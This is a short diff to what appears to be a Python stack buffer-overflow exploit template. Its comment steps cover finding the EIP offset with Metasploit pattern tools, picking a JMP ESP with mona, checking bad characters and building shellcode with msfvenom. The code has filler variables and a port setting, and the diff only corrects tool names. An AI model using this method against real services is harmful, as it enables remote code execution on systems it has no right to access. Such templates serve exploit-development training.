@@ -2,8 +2,7 @@
 
 """
 1. Use a fuzzer or check poc for offset
-2. Find eip using msf_pattern_create -l #
-3. Copy the EIP at crash. Run msf_pattern_offset -l # -q #eip_return#
+3. Copy the EIP at crash. Run msf-pattern_offset -l # -q #eip_return#
 4. Use !mona modules & !mona find -s "\xff\xe4" -m "PROCESSNAME" to find a good jump. (Might need to tweak ASM code)
 5. After changing EIP, start checking for bad chars.
 6. Create a shell code payload with venom.
@@ -20,7 +19,7 @@ port = 1337
 
 
 prefix = "Ascii_Inputs" # If the poc has ascii or other input to trigger put here.
-finder = "" # msf_pattern_create payload
+finder = "" # msf-pattern_create payload
 
 offset = 0  # The Offset returned
 buff = "A" * offset # This is just filler to make the overflow happen
